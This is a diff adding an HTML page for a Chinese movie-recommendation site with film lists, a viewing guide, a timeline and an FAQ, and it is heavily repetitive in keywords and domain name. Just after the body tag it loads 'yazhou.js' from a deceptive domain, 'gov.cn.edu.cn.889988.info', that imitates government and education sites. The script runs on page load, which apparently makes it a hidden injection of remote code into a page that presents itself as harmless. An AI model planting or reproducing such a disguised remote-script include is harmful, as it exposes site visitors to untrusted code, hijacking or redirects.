@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="红枣电影网（hongzaodianyingwang-app）— 提供最新电影资讯、热门影视推荐、高分片单与观影指南，域名 https://hongzaodianyingwang-app.github.io">
+<meta name="keywords" content="红枣电影网, hongzaodianyingwang-app, 电影, 电影推荐, 影视资讯, 在线观影指南">
+<meta name="robots" content="index, follow">
+<meta name="author" content="红枣电影网">
+<meta property="og:title" content="红枣电影网 - 发现好电影">
+<meta property="og:description" content="红枣电影网（hongzaodianyingwang-app）汇聚最新电影资讯、热门影视推荐与高分片单。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://hongzaodianyingwang-app.github.io">
+<title>红枣电影网 - 发现好电影 | hongzaodianyingwang-app.github.io</title>
+<style>
+    :root{
+        --bg:#0b0d17;
+        --bg2:#121629;
+        --card:rgba(255,255,255,.05);
+        --line:rgba(255,255,255,.1);
+        --txt:#eef0f7;
+        --sub:#a8adc4;
+        --red:#ff4d6d;
+        --red2:#ff8fa3;
+        --gold:#ffd166;
+    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+    body{
+        font-family:"PingFang SC","Microsoft YaHei",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+        background:var(--bg);
+        color:var(--txt);
+        line-height:1.7;
+        overflow-x:hidden;
+    }
+    a{color:inherit;text-decoration:none}
+    .wrap{max-width:1160px;margin:0 auto;padding:0 20px}
+
+    /* 背景光斑 */
+    .aurora{position:fixed;inset:0;z-index:-1;overflow:hidden}
+    .aurora i{position:absolute;border-radius:50%;filter:blur(80px);opacity:.35;animation:float 14s ease-in-out infinite alternate}
+    .aurora i:nth-child(1){width:420px;height:420px;background:var(--red);top:-120px;left:-80px}
+    .aurora i:nth-child(2){width:360px;height:360px;background:#7b2ff0;bottom:10%;right:-100px;animation-delay:-5s}
+    .aurora i:nth-child(3){width:300px;height:300px;background:#118ab2;top:40%;left:30%;animation-delay:-9s}
+    @keyframes float{to{transform:translate3d(40px,-30px,0) scale(1.15)}}
+
+    /* 顶部导航 */
+    header{position:sticky;top:0;z-index:50;backdrop-filter:blur(12px);background:rgba(11,13,23,.72);border-bottom:1px solid var(--line)}
+    .nav{display:flex;align-items:center;gap:18px;height:64px}
+    .logo{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.5px;font-size:18px}
+    .logo span.seed{width:30px;height:30px;border-radius:9px;background:linear-gradient(135deg,var(--red),var(--gold));display:grid;place-items:center;color:#2b0008;font-size:16px}
+    .logo em{font-style:normal;color:var(--red2)}
+    .nav-links{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+    .nav-links a{padding:8px 14px;border-radius:999px;font-size:14px;color:var(--sub);transition:.25s}
+    .nav-links a:hover{color:#fff;background:var(--card)}
+    .nav-links a.hl{color:#fff;background:linear-gradient(135deg,var(--red),#c9184a);box-shadow:0 6px 18px -8px var(--red)}
+
+    /* 首屏 */
+    .hero{min-height:min(82vh,640px);display:grid;place-items:center;text-align:center;padding:80px 20px 60px}
+    .hero .tag{display:inline-block;padding:6px 16px;border-radius:999px;border:1px solid var(--line);background:var(--card);color:var(--gold);font-size:13px;margin-bottom:22px;letter-spacing:1px}
+    .hero h1{font-size:clamp(34px,7vw,68px);line-height:1.1;font-weight:900;background:linear-gradient(90deg,#fff,var(--red2) 60%,var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent}
+    .hero p{margin:20px auto 0;max-width:620px;color:var(--sub);font-size:clamp(15px,2.4vw,18px)}
+    .hero .acts{margin-top:34px;display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+    .btn{padding:14px 30px;border-radius:999px;font-weight:700;font-size:15px;transition:.25s;cursor:pointer;border:0}
+    .btn.pri{background:linear-gradient(135deg,var(--red),#c9184a);color:#fff;box-shadow:0 12px 28px -10px var(--red)}
+    .btn.pri:hover{transform:translateY(-3px)}
+    .btn.ghost{background:var(--card);color:#fff;border:1px solid var(--line)}
+    .btn.ghost:hover{border-color:var(--red2)}
+    .scroll{position:absolute;bottom:26px;left:50%;transform:translateX(-50%);color:var(--sub);font-size:12px;letter-spacing:2px;animation:bob 1.6s infinite}
+    @keyframes bob{50%{transform:translate(-50%,8px);opacity:.4}}
+
+    section{padding:80px 0}
+    .eyebrow{color:var(--red2);font-size:13px;letter-spacing:3px;font-weight:700}
+    .h2{font-size:clamp(26px,4.5vw,42px);font-weight:900;margin:8px 0 14px}
+    .lead{color:var(--sub);max-width:640px;font-size:16px}
+
+    /* 通用网格 */
+    .grid{display:grid;gap:22px;margin-top:40px}
+    .g4{grid-template-columns:repeat(4,1fr)}
+    .g3{grid-template-columns:repeat(3,1fr)}
+    .g2{grid-template-columns:repeat(2,1fr)}
+    .card{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:26px;transition:.3s;position:relative;overflow:hidden}
+    .card:hover{transform:translateY(-6px);border-color:rgba(255,77,109,.5);box-shadow:0 20px 40px -20px rgba(255,77,109,.4)}
+    .card .ic{width:52px;height:52px;border-radius:14px;background:linear-gradient(135deg,var(--red),var(--gold));display:grid;place-items:center;font-size:24px;margin-bottom:16px}
+    .card h3{font-size:19px;margin-bottom:8px}
+    .card p{color:var(--sub);font-size:14.5px}
+    .num{position:absolute;right:18px;top:14px;font-size:40px;font-weight:900;color:rgba(255,255,255,.05)}
+
+    /* 电影卡 */
+    .film{background:var(--card);border:1px solid var(--line);border-radius:18px;overflow:hidden;transition:.3s;display:flex;flex-direction:column}
+    .film:hover{transform:translateY(-6px);box-shadow:0 22px 44px -22px rgba(0,0,0,.8)}
+    .poster{aspect-ratio:2/3;position:relative;overflow:hidden}
+    .poster .fill{position:absolute;inset:0;display:grid;place-items:center;font-size:40px}
+    .film:hover .poster .fill{transform:scale(1.08)}
+    .film .meta{padding:16px;flex:1;display:flex;flex-direction:column}
+    .film h4{font-size:16.5px;margin-bottom:6px}
+    .film .row{display:flex;gap:8px;flex-wrap:wrap;margin-top:auto;padding-top:12px}
+    .chip{font-size:12px;padding:4px 10px;border-radius:999px;background:rgba(255,255,255,.08);color:var(--sub)}
+    .chip.hot{color:var(--gold);background:rgba(255,209,102,.12)}
+    .rate{position:absolute;top:12px;left:12px;background:rgba(0,0,0,.6);backdrop-filter:blur(6px);color:var(--gold);font-weight:800;font-size:13px;padding:5px 10px;border-radius:999px}
+
+    /* 时间线 */
+    .timeline{position:relative;margin-top:44px;padding-left:26px;border-left:2px solid var(--line)}
+    .tl-item{position:relative;padding:0 0 34px 24px}
+    .tl-item::before{content:"";position:absolute;left:-33px;top:6px;width:14px;height:14px;border-radius:50%;background:var(--red);box-shadow:0 0 0 5px rgba(255,77,109,.18)}
+    .tl-item time{color:var(--gold);font-weight:800;font-size:14px;letter-spacing:1px}
+    .tl-item h4{font-size:18px;margin:4px 0 6px}
+    .tl-item p{color:var(--sub);font-size:14.5px}
+
+    /* 数据条 */
+    .bars{margin-top:36px;display:flex;flex-direction:column;gap:16px}
+    .bar span{display:flex;justify-content:space-between;font-size:14px;margin-bottom:6px;color:var(--sub)}
+    .bar b{color:#fff}
+    .track{height:10px;border-radius:999px;background:rgba(255,255,255,.08);overflow:hidden}
+    .fillbar{height:100%;border-radius:999px;background:linear-gradient(90deg,var(--red),var(--gold));transform:scaleX(0);transform-origin:left;transition:transform 1.2s cubic-bezier(.2,.8,.2,1)}
+    .fillbar.on{transform:scaleX(1)}
+
+    /* FAQ */
+    details{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px 22px;margin-bottom:12px;transition:.25s}
+    details:hover{border-color:rgba(255,77,109,.4)}
+    details summary{cursor:pointer;font-weight:700;font-size:16px;list-style:none;display:flex;justify-content:space-between;gap:14px}
+    details summary::-webkit-details-marker{display:none}
+    details summary::after{content:"＋";color:var(--red2);font-size:20px;flex:none}
+    details[open] summary::after{content:"－"}
+    details p{margin-top:12px;color:var(--sub);font-size:14.5px}
+
+    /* 页脚 */
+    footer{border-top:1px solid var(--line);padding:50px 0 30px;background:var(--bg2)}
+    .foot-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:30px}
+    .foot-brand p{color:var(--sub);font-size:14px;margin-top:12px;max-width:320px}
+    .foot-col h5{font-size:15px;margin-bottom:14px;color:#fff}
+    .foot-col a{display:block;color:var(--sub);font-size:14px;padding:5px 0;transition:.2s}
+    .foot-col a:hover{color:var(--red2);transform:translateX(4px)}
+    .copy{margin-top:36px;padding-top:22px;border-top:1px solid var(--line);color:var(--sub);font-size:13px;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+    .kw{color:var(--red2);font-weight:700}
+
+    @media(max-width:900px){
+        .g4{grid-template-columns:repeat(2,1fr)}
+        .foot-grid{grid-template-columns:1fr 1fr}
+    }
+    @media(max-width:640px){
+        .nav{height:58px;gap:10px}
+        .logo{font-size:15px}
+        .logo span.seed{width:26px;height:26px;font-size:14px}
+        .nav-links a{padding:7px 10px;font-size:13px}
+        .nav-links a:not(.hl){display:none}
+        section{padding:60px 0}
+        .g3,.g2,.g4{grid-template-columns:1fr}
+        .hero{min-height:70vh;padding-top:60px}
+        .btn{padding:12px 24px;font-size:14px}
+        .foot-grid{grid-template-columns:1fr}
+    }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="aurora" aria-hidden="true"><i></i><i></i><i></i></div>
+
+<header>
+    <div class="wrap nav">
+        <a class="logo" href="#top"><span class="seed">枣</span>红枣电影网<em>.app</em></a>
+        <nav class="nav-links" aria-label="主导航">
+            <a href="#home" class="hl">首页</a>
+            <a href="#news">影视资讯</a>
+            <a href="#hot">热片榜单</a>
+            <a href="#guide">观影指南</a>
+            <a href="#about">关于我们</a>
+            <a href="#faq">常见问题</a>
+        </nav>
+    </div>
+</header>
+
+<main id="top">
+
+    <!-- 栏目一：首页 -->
+    <section id="home" class="hero">
+        <div class="wrap">
+            <div class="tag">🎬 红枣电影网 · hongzaodianyingwang-app</div>
+            <h1>发现每一部<br>值得一看的好电影</h1>
+            <p>红枣电影网（<strong>hongzaodianyingwang-app</strong>）致力于为影迷提供最新电影资讯、精选片单与实用观影指南。访问 <span class="kw">https://hongzaodianyingwang-app.github.io</span> 开启你的下一次观影之旅。</p>
+            <div class="acts">
+                <a class="btn pri" href="#hot">查看今日热片</a>
+                <a class="btn ghost" href="#guide">获取观影指南</a>
+            </div>
+        </div>
+        <div class="scroll">向下滚动 ↓</div>
+    </section>
+
+    <!-- 栏目二：影视资讯 -->
+    <section id="news" class="wrap">
+        <div class="eyebrow">COLUMN 01 · 影视资讯</div>
+        <h2 class="h2">不止于观影，更懂电影</h2>
+        <p class="lead">红枣电影网每日更新影视行业动态、新片定档、导演访谈与幕后花絮，帮你快速抓住值得关注的影像话题。</p>
+        <div class="grid g4">
+            <article class="card">
+                <div class="num">01</div>
+                <div class="ic">📰</div>
+                <h3>新片速递</h3>
+                <p>第一时间整理国内外定档与上映信息，不错过任何一部心头好。</p>
+            </article>
+            <article class="card">
+                <div class="num">02</div>
+                <div class="ic">🎞️</div>
+                <h3>深度解读</h3>
+                <p>从镜头语言到叙事结构，读懂导演藏在画面里的巧思。</p>
+            </article>
+            <article class="card">
+                <div class="num">03</div>
+                <div class="ic">🌍</div>
+                <h3>全球视野</h3>
+                <p>覆盖戛纳、柏林、威尼斯等电影节资讯，接轨世界影坛。</p>
+            </article>
+            <article class="card">
+                <div class="num">04</div>
+                <div class="ic">💬</div>
+                <h3>影评精选</h3>
+                <p>拒绝剧透的真诚评价，用几分钟判断是否值得走进影院。</p>
+            </article>
+        </div>
+    </section>
+
+    <!-- 栏目三：热片榜单 -->
+    <section id="hot" class="wrap">
+        <div class="eyebrow">COLUMN 02 · 热片榜单</div>
+        <h2 class="h2">本周观众都在看</h2>
+        <p class="lead">由红枣电影网编辑团队结合口碑、热度与类型 diversity 精选的片单，覆盖剧情、科幻、动画、悬疑等多元题材。</p>
+        <div class="grid g3">
+            <article class="film">
+                <div class="poster"><div class="fill" style="background:linear-gradient(160deg,#2b1055,#7597de)">🚀</div><div class="rate">★ 9.1</div></div>
+                <div class="meta">
+                    <h4>星际回响</h4>
+                    <p style="color:var(--sub);font-size:14px">一部关于孤独与连接的太空史诗，视觉与配乐双双封神。</p>
+                    <div class="row"><span class="chip hot">科幻</span><span class="chip">冒险</span><span class="chip">142分钟</span></div>
+                </div>
+            </article>
+            <article class="film">
+                <div class="poster"><div class="fill" style="background:linear-gradient(160deg,#3a0ca3,#f72585)">🕵️</div><div class="rate">★ 8.7</div></div>
+                <div class="meta">
+                    <h4>夜色拼图</h4>
+                    <p style="color:var(--sub);font-size:14px">多重时间线交织的悬疑佳作，反转直到最后一秒。</p>
+                    <div class="row"><span class="chip hot">悬疑</span><span class="chip">犯罪</span><span class="chip">118分钟</span></div>
+                </div>
+            </article>
+            <article class="film">
+                <div class="poster"><div class="fill" style="background:linear-gradient(160deg,#f77f00,#d62828)">🐾</div><div class="rate">★ 8.9</div></div>
+                <div class="meta">
+                    <h4>森林物语</h4>
+                    <p style="color:var(--sub);font-size:14px">手绘动画治愈之作，适合与孩子一起观看的温暖旅程。</p>
+                    <div class="row"><span class="chip hot">动画</span><span class="chip">家庭</span><span class="chip">96分钟</span></div>
+                </div>
+            </article>
+            <article class="film">
+                <div class="poster"><div class="fill" style="background:linear-gradient(160deg,#14213d,#fca311)">🎭</div><div class="rate">★ 8.5</div></div>
+                <div class="meta">
+                    <h4>城南旧事</h4>
+                    <p style="color:var(--sub);font-size:14px">细腻刻画时代变迁下小人物的命运与温情。</p>
+                    <div class="row"><span class="chip">剧情</span><span class="chip">年代</span><span class="chip">128分钟</span></div>
+                </div>
+            </article>
+            <article class="film">
+                <div class="poster"><div class="fill" style="background:linear-gradient(160deg,#0f4c5c,#5c80bc)">🌊</div><div class="rate">★ 8.3</div></div>
+                <div class="meta">
+                    <h4>深蓝之境</h4>
+                    <p style="color:var(--sub);font-size:14px">纪录片式深海探险，每一帧都可作壁纸的自然奇观。</p>
+                    <div class="row"><span class="chip">纪录片</span><span class="chip">自然</span><span class="chip">88分钟</span></div>
+                </div>
+            </article>
+            <article class="film">
+                <div class="poster"><div class="fill" style="background:linear-gradient(160deg,#6a0572,#ab1d3c)">🔥</div><div class="rate">★ 8.6</div></div>
+                <div class="meta">
+                    <h4>烈焰拳锋</h4>
+                    <p style="color:var(--sub);font-size:14px">拳台内外的热血与救赎，动作设计干脆利落。</p>
+                    <div class="row"><span class="chip hot">动作</span><span class="chip">运动</span><span class="chip">110分钟</span></div>
+                </div>
+            </article>
+        </div>
+    </section>
+
+    <!-- 栏目四：观影指南 -->
+    <section id="guide" class="wrap">
+        <div class="eyebrow">COLUMN 03 · 观影指南</div>
+        <h2 class="h2">选片不再纠结</h2>
+        <p class="lead">红枣电影网为你整理从「不知道看什么」到「看完想二刷」的完整路径。</p>
+        <div class="grid g2">
+            <div>
+                <div class="grid g2" style="margin-top:0">
+                    <div class="card">
+                        <div class="ic">🗓️</div>
+                        <h3>按心情选片</h3>
+                        <p>开心、孤独、想哭、想燃——情绪先行，片单跟上。</p>
+                    </div>
+                    <div class="card">
+                        <div class="ic">⏱️</div>
+                        <h3>按时长选片</h3>
+                        <p>30 分钟碎片时间也能看完的短片与纪录片推荐。</p>
+                    </div>
+                    <div class="card">
+                        <div class="ic">🎌</div>
+                        <h3>按地区选片</h3>
+                        <p>华语、日韩、欧美、拉美，打开世界影像地图。</p>
+                    </div>
+                    <div class="card">
+                        <div class="ic">🏆</div>
+                        <h3>按奖项选片</h3>
+                        <p>奥斯卡、金棕榈、金像奖获奖与提名作品速览。</p>
+                    </div>
+                </div>
+            </div>
+            <div>
+                <h3 style="font-size:20px;margin-bottom:6px">影迷偏好分布</h3>
+                <p class="lead" style="font-size:14px">基于红枣电影网读者调研的题材喜好占比（示意数据）。</p>
+                <div class="bars">
+                    <div class="bar"><span>剧情 / 文艺 <b>82%</b></span><div class="track"><div class="fillbar" data-w=".82"></div></div></div>
+                    <div class="bar"><span>科幻 / 奇幻 <b>74%</b></span><div class="track"><div class="fillbar" data-w=".74"></div></div></div>
+                    <div class="bar"><span>悬疑 / 犯罪 <b>68%</b></span><div class="track"><div class="fillbar" data-w=".68"></div></div></div>
+                    <div class="bar"><span>动画 / 家庭 <b>55%</b></span><div class="track"><div class="fillbar" data-w=".55"></div></div></div>
+                    <div class="bar"><span>纪录片 <b>41%</b></span><div class="track"><div class="fillbar" data-w=".41"></div></div></div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 栏目五：更新日志 -->
+    <section class="wrap">
+        <div class="eyebrow">COLUMN 04 · 更新日志</div>
+        <h2 class="h2">红枣电影网的成长足迹</h2>
+        <div class="timeline">
+            <div class="tl-item">
+                <time>2026 · 秋季</time>
+                <h4>全新视觉上线</h4>
+                <p>采用深色沉浸式设计，首屏动态光斑与卡片悬浮动效，移动端阅读体验全面优化。</p>
+            </div>
+            <div class="tl-item">
+                <time>2026 · 夏季</time>
+                <h4>热片榜单频道开通</h4>
+                <p>每周更新编辑精选片单，覆盖 8 大题材，支持按心情、时长、地区三维筛选。</p>
+            </div>
+            <div class="tl-item">
+                <time>2026 · 春季</time>
+                <h4>观影指南栏目发布</h4>
+                <p>从「不知道看什么」出发，建立情绪化选片体系，累计产出百余篇选片文章。</p>
+            </div>
+            <div class="tl-item">
+                <time>2025 · 冬季</time>
+                <h4>红枣电影网正式启航</h4>
+                <p>域名 <span class="kw">hongzaodianyingwang-app.github.io</span> 落地，专注为华语影迷提供干净、专业的电影内容服务。</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- 栏目六：关于我们 -->
+    <section id="about" class="wrap">
+        <div class="eyebrow">COLUMN 05 · 关于我们</div>
+        <h2 class="h2">关于红枣电影网</h2>
+        <div class="grid g3">
+            <div class="card">
+                <div class="ic">🎯</div>
+                <h3>我们的定位</h3>
+                <p>红枣电影网（hongzaodianyingwang-app）是一个专注于电影发现与推荐的内容站点，网址为 <span class="kw">https://hongzaodianyingwang-app.github.io</span>。</p>
+            </div>
+            <div class="card">
+                <div class="ic">❤️</div>
+                <h3>我们的态度</h3>
+                <p>拒绝水文与标题党，每一篇推荐都经过真实观看与思考，把时间留给真正的好电影。</p>
+            </div>
+            <div class="card">
+                <div class="ic">🤝</div>
+                <h3>联系与合作</h3>
+                <p>欢迎影视从业者、影评人与品牌方通过站内栏目与我们取得联系，共创优质内容。</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- 栏目七：常见问题 -->
+    <section id="faq" class="wrap">
+        <div class="eyebrow">COLUMN 06 · 常见问题</div>
+        <h2 class="h2">你关心的问题</h2>
+        <details open>
+            <summary>红枣电影网的网址是什么？</summary>
+            <p>官方网址为 <span class="kw">https://hongzaodianyingwang-app.github.io</span>，请认准域名，避免误入仿冒站点。</p>
+        </details>
+        <details>
+            <summary>红枣电影网提供在线播放吗？</summary>
+            <p>本站为电影资讯与推荐站点，主要提供影片介绍、评分参考与观影指引，具体播放入口以各正规影视平台为准。</p>
+        </details>
+        <details>
+            <summary>如何向红枣电影网投稿？</summary>
+            <p>欢迎通过「关于我们」栏目中的合作方式提交影评或选题，审核通过后我们将标注作者署名。</p>
+        </details>
+        <details>
+            <summary>片单多久更新一次？</summary>
+            <p>热片榜单每周更新，影视资讯每日更新，重要电影节期间将开启专题滚动报道。</p>
+        </details>
+    </section>
+
+</main>
+
+<footer>
+    <div class="wrap">
+        <div class="foot-grid">
+            <div class="foot-brand">
+                <a class="logo" href="#top"><span class="seed">枣</span>红枣电影网<em>.app</em></a>
+                <p>红枣电影网（hongzaodianyingwang-app），陪你发现每一部值得一看的好电影。域名：https://hongzaodianyingwang-app.github.io</p>
+            </div>
+            <div class="foot-col">
+                <h5>栏目导航</h5>
+                <a href="#home">首页</a>
+                <a href="#news">影视资讯</a>
+                <a href="#hot">热片榜单</a>
+                <a href="#guide">观影指南</a>
+            </div>
+            <div class="foot-col">
+                <h5>精选题材</h5>
+                <a href="#hot">剧情文艺</a>
+                <a href="#hot">科幻奇幻</a>
+                <a href="#hot">悬疑犯罪</a>
+                <a href="#hot">动画家庭</a>
+            </div>
+            <div class="foot-col">
+                <h5>关于本站</h5>
+                <a href="#about">关于红枣电影网</a>
+                <a href="#faq">常见问题</a>
+                <a href="#top">返回顶部</a>
+            </div>
+        </div>
+        <div class="copy">
+            <span>© <span id="yr">2026</span> 红枣电影网 hongzaodianyingwang-app · 电影资讯与推荐站点</span>
+            <span>网站网址：https://hongzaodianyingwang-app.github.io</span>
+        </div>
+    </div>
+</footer>
+
+<script>
+    // 年份
+    document.getElementById('yr').textContent = new Date().getFullYear();
+
+    // 滚动触发进度条动画
+    var bars = document.querySelectorAll('.fillbar');
+    if ('IntersectionObserver' in window) {
+        var io = new IntersectionObserver(function (entries) {
+            entries.forEach(function (e) {
+                if (e.isIntersecting) {
+                    e.target.style.transform = 'scaleX(' + e.target.dataset.w + ')';
+                    io.unobserve(e.target);
+                }
+            });
+        }, {threshold: .3});
+        bars.forEach(function (b) { io.observe(b); });
+    } else {
+        bars.forEach(function (b) { b.style.transform = 'scaleX(' + b.dataset.w + ')'; });
+    }
+
+    // 导航高亮
+    var links = document.querySelectorAll('.nav-links a');
+    var secs = ['home','news','hot','guide','about','faq'].map(function (id) { return document.getElementById(id); });
+    window.addEventListener('scroll', function () {
+        var pos = window.scrollY + 120;
+        var idx = 0;
+        secs.forEach(function (s, i) { if (s && s.offsetTop <= pos) idx = i; });
+        links.forEach(function (a, i) { a.classList.toggle('hl', i === idx); });
+    }, {passive: true});
+</script>
+</body>
+</html>
